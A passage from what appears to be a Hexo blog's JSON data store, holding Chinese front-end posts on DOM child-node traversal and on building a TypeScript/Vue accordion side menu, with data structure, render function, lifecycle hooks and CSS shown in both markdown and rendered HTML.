class=\"headerlink\" title=\"遍历dom节点\"></a>遍历dom节点</h2><h3 id=\"childNodes-和-children-区别\"><a href=\"#childNodes-和-children-区别\" class=\"headerlink\" title=\"childNodes 和 children 区别\"></a><code>childNodes</code> 和 <code>children</code> 区别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这部分为获取元素系列操作重点在 `childNodes` `children` --&gt;</span><br><span class=\"line\">// let ddHight = document.getElementsByClassName(&apos;showdd&apos;)[0];</span><br><span class=\"line\">// let dCh1 = ddHight.childNodes;</span><br><span class=\"line\">// let dCh2 = ddHight.children;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.baidu.com/s?wd=遍历dom节点&amp;rsv_spt=1&amp;rsv_iqid=0xaf4a3db3000138a2&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&amp;rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&amp;inputT=4844&amp;rsv_pq=a5934c810006a2c1&amp;rsv_sug3=50&amp;rsv_sug1=40&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;prefixsug=%25E9%2581%258D%25E5%258E%2586dom&amp;rsp=1&amp;rsv_sug4=4844\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"遍历dom节点\"><a href=\"#遍历dom节点\" class=\"headerlink\" title=\"遍历dom节点\"></a>遍历dom节点</h2><h3 id=\"childNodes-和-children-区别\"><a href=\"#childNodes-和-children-区别\" class=\"headerlink\" title=\"childNodes 和 children 区别\"></a><code>childNodes</code> 和 <code>children</code> 区别</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这部分为获取元素系列操作重点在 `childNodes` `children` --&gt;</span><br><span class=\"line\">// let ddHight = document.getElementsByClassName(&apos;showdd&apos;)[0];</span><br><span class=\"line\">// let dCh1 = ddHight.childNodes;</span><br><span class=\"line\">// let dCh2 = ddHight.children;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.baidu.com/s?wd=遍历dom节点&amp;rsv_spt=1&amp;rsv_iqid=0xaf4a3db3000138a2&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=%25E5%25A6%2582%25E4%25BD%2595%25E9%2581%258D%25E5%258E%2586element%25E8%258A%2582%25E7%2582%25B9&amp;rsv_t=6622C4udbYHMy%2Fz88Zn2YEqLcdlbOvZsVIngnU74KJya5W8v7BGUVZMdfejA1X93%2Fo2xXg&amp;inputT=4844&amp;rsv_pq=a5934c810006a2c1&amp;rsv_sug3=50&amp;rsv_sug1=40&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;prefixsug=%25E9%2581%258D%25E5%258E%2586dom&amp;rsp=1&amp;rsv_sug4=4844\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"面向对象-手写手风琴特效","date":"2018-05-24T02:56:14.000Z","_content":"## TS + ES6 + VUE 实现手风琴特效\n\n------\n### 第一步 定义 数据结构\n````\npublic list: any = [\n  {\n    card: '走进四海',\n    item: [\n      {\n        url: './into',\n        name: '四海简介'\n      },\n      {\n        url: './into',\n        name: '荣誉证书'\n      }\n    ]\n  },\n  {\n    card: '服务项目',\n    item: [\n      {\n        url: './server',\n        name: '服务项目'\n      }\n    ]\n  },\n  {\n    card: '施工案例',\n    item: [\n      {\n        url: './case',\n        name: '成品保护'\n      },\n      {\n        url: './case',\n        name: '保洁'\n      },\n      {\n        url: './case',\n        name: '外墙清洗'\n      },\n      {\n        url: './case',\n        name: '石材翻新'\n      },\n      {\n        url: './case',\n        name: '家政服务'\n      },\n      {\n        url: './case',\n        name: '电梯司机'\n      },\n      {\n        url: './case',\n        name: '停车管理'\n      },\n      {\n        url: './case',\n        name: '消防工程'\n      },\n      {\n        url: './case',\n        name: '拆迁工程'\n      },\n    ]\n  },\n  {\n    card: '团队风采',\n    item: [\n      {\n        url: './into',\n        name: '风采展示'\n      }\n    ]\n  },\n  {\n    card: '新闻中心',\n    item: [\n      {\n        url: './into',\n        name: '新闻中心'\n      }\n    ]\n  },\n  {\n    card: '人才招聘',\n    item: [\n      {\n        url: './into',\n        name: '招聘详情'\n      }\n    ]\n  },\n  {\n    card: '联系我们',\n    item: [\n      {\n        url: './into',\n        name: '联系方式'\n      }\n    ]\n  }\n]\n````\n\n`数据结构` 决定 `业务逻辑` 与 `实现思路`\n\n---\n### 第二步 根据数据实现虚拟DOM\n````\npublic listFor(h: CreateElement) {\n  let res = [];\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = [];\n    for (let n = 0; n < this.list[i].item.length; n++) {\n        dd.push(\n          <span>\n            <router-link to={this.list[i].item[n].url}>{this.list[i].item[n].name}</router-link>\n          </span>\n        )\n    }\n\n    res.push(\n      <dl>\n        <dt onClick={() => { this.cardList(i + 1) }}>\n          <span class={this.listNum === i + 1 ? 'show' : ''}>{this.list[i].card}</span>\n        </dt>\n        <dd class={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}>\n          {dd}\n        </dd>\n      </dl >\n    )\n  }\n  return res\n}\n````\n---\n\n### 第三步 两个生命周期\n````\n// vue生命周期 挂载时执行\npublic mounted() {\n  this.showdd()\n}\n\n// vue生命周期 页面数据更新时执行\npublic updated() {\n  this.showdd()\n}\n````\n\n### 第四步 业务逻辑\n````\npublic showdd() {\n  let sideMenu = document.getElementsByClassName('sideMenu')[0];\n  \n  // 此循环为了每次点击前所有列表高度清零\n  for (let i = 0; i < sideMenu.children.length; i++) {\n    let evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n    evedd.setAttribute('style', `height: 0px`)\n  }\n\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = sideMenu.getElementsByClassName(`showdd${i}`)[0];\n    \n    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据\n    if (dd !== undefined) {\n      dd.setAttribute('style', `height:${itemLen * 36}px`)\n      console.log('get H', dd.clientHeight);\n    }\n    console.log(itemLen);\n  }\n}\n````\n\n### 第五步 CSS样式\n此步骤为样式的实现，根据 `class` 或 `id` 实现\n````\nele{\n    overflow: hidden;\n    opacity: 0; // 不太需要\n    height: 0;\n    transition: all .5s;\n}\n\nele.show {\n    opacity: 1; // 可以省略\n}\n````\n----------\n\n具体实现详见 `shrs`  四海日盛官网项目 `list.tsx`","source":"_posts/FrontEnd/JS/面向对象-手写手风琴特效.md","raw":"---\ntitle: 面向对象-手写手风琴特效\ndate: 2018-05-24 10:56:14\ntags: VUE ES6 TS 手风琴特效\ncategories: VUE \n---\n## TS + ES6 + VUE 实现手风琴特效\n\n------\n### 第一步 定义 数据结构\n````\npublic list: any = [\n  {\n    card: '走进四海',\n    item: [\n      {\n        url: './into',\n        name: '四海简介'\n      },\n      {\n        url: './into',\n        name: '荣誉证书'\n      }\n    ]\n  },\n  {\n    card: '服务项目',\n    item: [\n      {\n        url: './server',\n        name: '服务项目'\n      }\n    ]\n  },\n  {\n    card: '施工案例',\n    item: [\n      {\n        url: './case',\n        name: '成品保护'\n      },\n      {\n        url: './case',\n        name: '保洁'\n      },\n      {\n        url: './case',\n        name: '外墙清洗'\n      },\n      {\n        url: './case',\n        name: '石材翻新'\n      },\n      {\n        url: './case',\n        name: '家政服务'\n      },\n      {\n        url: './case',\n        name: '电梯司机'\n      },\n      {\n        url: './case',\n        name: '停车管理'\n      },\n      {\n        url: './case',\n        name: '消防工程'\n      },\n      {\n        url: './case',\n        name: '拆迁工程'\n      },\n    ]\n  },\n  {\n    card: '团队风采',\n    item: [\n      {\n        url: './into',\n        name: '风采展示'\n      }\n    ]\n  },\n  {\n    card: '新闻中心',\n    item: [\n      {\n        url: './into',\n        name: '新闻中心'\n      }\n    ]\n  },\n  {\n    card: '人才招聘',\n    item: [\n      {\n        url: './into',\n        name: '招聘详情'\n      }\n    ]\n  },\n  {\n    card: '联系我们',\n    item: [\n      {\n        url: './into',\n        name: '联系方式'\n      }\n    ]\n  }\n]\n````\n\n`数据结构` 决定 `业务逻辑` 与 `实现思路`\n\n---\n### 第二步 根据数据实现虚拟DOM\n````\npublic listFor(h: CreateElement) {\n  let res = [];\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = [];\n    for (let n = 0; n < this.list[i].item.length; n++) {\n        dd.push(\n          <span>\n            <router-link to={this.list[i].item[n].url}>{this.list[i].item[n].name}</router-link>\n          </span>\n        )\n    }\n\n    res.push(\n      <dl>\n        <dt onClick={() => { this.cardList(i + 1) }}>\n          <span class={this.listNum === i + 1 ? 'show' : ''}>{this.list[i].card}</span>\n        </dt>\n        <dd class={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}>\n          {dd}\n        </dd>\n      </dl >\n    )\n  }\n  return res\n}\n````\n---\n\n### 第三步 两个生命周期\n````\n// vue生命周期 挂载时执行\npublic mounted() {\n  this.showdd()\n}\n\n// vue生命周期 页面数据更新时执行\npublic updated() {\n  this.showdd()\n}\n````\n\n### 第四步 业务逻辑\n````\npublic showdd() {\n  let sideMenu = document.getElementsByClassName('sideMenu')[0];\n  \n  // 此循环为了每次点击前所有列表高度清零\n  for (let i = 0; i < sideMenu.children.length; i++) {\n    let evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n    evedd.setAttribute('style', `height: 0px`)\n  }\n\n  for (let i = 0; i < this.list.length; i++) {\n    let dd = sideMenu.getElementsByClassName(`showdd${i}`)[0];\n    \n    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据\n    if (dd !== undefined) {\n      dd.setAttribute('style', `height:${itemLen * 36}px`)\n      console.log('get H', dd.clientHeight);\n    }\n    console.log(itemLen);\n  }\n}\n````\n\n### 第五步 CSS样式\n此步骤为样式的实现，根据 `class` 或 `id` 实现\n````\nele{\n    overflow: hidden;\n    opacity: 0; // 不太需要\n    height: 0;\n    transition: all .5s;\n}\n\nele.show {\n    opacity: 1; // 可以省略\n}\n````\n----------\n\n具体实现详见 `shrs`  四海日盛官网项目 `list.tsx`","slug":"FrontEnd/JS/面向对象-手写手风琴特效","published":1,"updated":"2018-05-24T05:59:52.886Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2d1007lb8xjbg303a3k","content":"<h2 id=\"TS-ES6-VUE-实现手风琴特效\"><a href=\"#TS-ES6-VUE-实现手风琴特效\" class=\"headerlink\" title=\"TS + ES6 + VUE 实现手风琴特效\"></a>TS + ES6 + VUE 实现手风琴特效</h2><hr>\n<h3 id=\"第一步-定义-数据结构\"><a href=\"#第一步-定义-数据结构\" class=\"headerlink\" title=\"第一步 定义 数据结构\"></a>第一步 定义 数据结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public list: any = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;走进四海&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;四海简介&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;荣誉证书&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;服务项目&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./server&apos;,</span><br><span class=\"line\">        name: &apos;服务项目&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;施工案例&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;成品保护&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;保洁&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;外墙清洗&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;石材翻新&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;家政服务&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;电梯司机&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;停车管理&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;消防工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./case&apos;,</span><br><span class=\"line\">        name: &apos;拆迁工程&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;团队风采&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;风采展示&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;新闻中心&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;新闻中心&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;人才招聘&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;招聘详情&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;联系我们&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;联系方式&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p><code>数据结构</code> 决定 <code>业务逻辑</code> 与 <code>实现思路</code></p>\n<hr>\n<h3 id=\"第二步-根据数据实现虚拟DOM\"><a href=\"#第二步-根据数据实现虚拟DOM\" class=\"headerlink\" title=\"第二步 根据数据实现虚拟DOM\"></a>第二步 根据数据实现虚拟DOM</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public listFor(h: CreateElement) &#123;</span><br><span class=\"line\">  let res = [];</span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = [];</span><br><span class=\"line\">    for (let n = 0; n &lt; this.list[i].item.length; n++) &#123;</span><br><span class=\"line\">        dd.push(</span><br><span class=\"line\">          &lt;span&gt;</span><br><span class=\"line\">            &lt;router-link to=&#123;this.list[i].item[n].url&#125;&gt;&#123;this.list[i].item[n].name&#125;&lt;/router-link&gt;</span><br><span class=\"line\">          &lt;/span&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res.push(</span><br><span class=\"line\">      &lt;dl&gt;</span><br><span class=\"line\">        &lt;dt onClick=&#123;() =&gt; &#123; this.cardList(i + 1) &#125;&#125;&gt;</span><br><span class=\"line\">          &lt;span class=&#123;this.listNum === i + 1 ? &apos;show&apos; : &apos;&apos;&#125;&gt;&#123;this.list[i].card&#125;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/dt&gt;</span><br><span class=\"line\">        &lt;dd class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;&gt;</span><br><span class=\"line\">          &#123;dd&#125;</span><br><span class=\"line\">        &lt;/dd&gt;</span><br><span class=\"line\">      &lt;/dl &gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return res</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"第三步-两个生命周期\"><a href=\"#第三步-两个生命周期\" class=\"headerlink\" title=\"第三步 两个生命周期\"></a>第三步 两个生命周期</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// vue生命周期 挂载时执行</span><br><span class=\"line\">public mounted() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// vue生命周期 页面数据更新时执行</span><br><span class=\"line\">public updated() &#123;</span><br><span class=\"line\">  this.showdd()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步-业务逻辑\"><a href=\"#第四步-业务逻辑\" class=\"headerlink\" title=\"第四步 业务逻辑\"></a>第四步 业务逻辑</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public showdd() &#123;</span><br><span class=\"line\">  let sideMenu = document.getElementsByClassName(&apos;sideMenu&apos;)[0];</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 此循环为了每次点击前所有列表高度清零</span><br><span class=\"line\">  for (let i = 0; i &lt; sideMenu.children.length; i++) &#123;</span><br><span class=\"line\">    let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\">    evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  for (let i = 0; i &lt; this.list.length; i++) &#123;</span><br><span class=\"line\">    let dd = sideMenu.getElementsByClassName(`showdd$&#123;i&#125;`)[0];</span><br><span class=\"line\">    </span><br><span class=\"line\">    let itemLen = this.list[i].item.length; // 此为数据结构长度，也就是每个子菜单高度的根据</span><br><span class=\"line\">    if (dd !== undefined) &#123;</span><br><span class=\"line\">      dd.setAttribute(&apos;style&apos;, `height:$&#123;itemLen * 36&#125;px`)</span><br><span class=\"line\">      console.log(&apos;get H&apos;, dd.clientHeight);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(itemLen);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"第五步-CSS样式\"><a href=\"#第五步-CSS样式\" class=\"headerlink\" title=\"第五步 CSS样式\"></a>第五步 CSS样式</h3><p>此步骤为样式的实现，根据 <code>class</code> 或 <code>id</code> 实现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ele&#123;</span><br><span class=\"line\">    overflow: hidden;</span><br><span class=\"line\">    opacity: 0; // 不太需要</span><br><span class=\"line\">    height: 0;</span><br><span class=\"line\">    transition: all .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ele.show &#123;</span><br><span class=\"line\">    opacity: 1; // 可以省略</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>具体实现详见 <code>shrs</code>  四海日盛官网项目 <code>list.tsx</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"TS-ES6-VUE-实现手风琴特效\"><a href=\"#TS-ES6-VUE-实现手风琴特效\" class=\"headerlink\" title=\"TS + ES6 + VUE 实现手风琴特效\"></a>TS + ES6 + VUE 实现手风琴特效</h2><hr>\n<h3 id=\"第一步-定义-数据结构\"><a href=\"#第一步-定义-数据结构\" class=\"headerlink\" title=\"第一步 定义 数据结构\"></a>第一步 定义 数据结构</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public list: any = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: &apos;走进四海&apos;,</span><br><span class=\"line\">    item: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;四海简介&apos;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        url: &apos;./into&apos;,</span><br><span class=\"line\">        name: &apos;荣誉证书&apos;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    card: 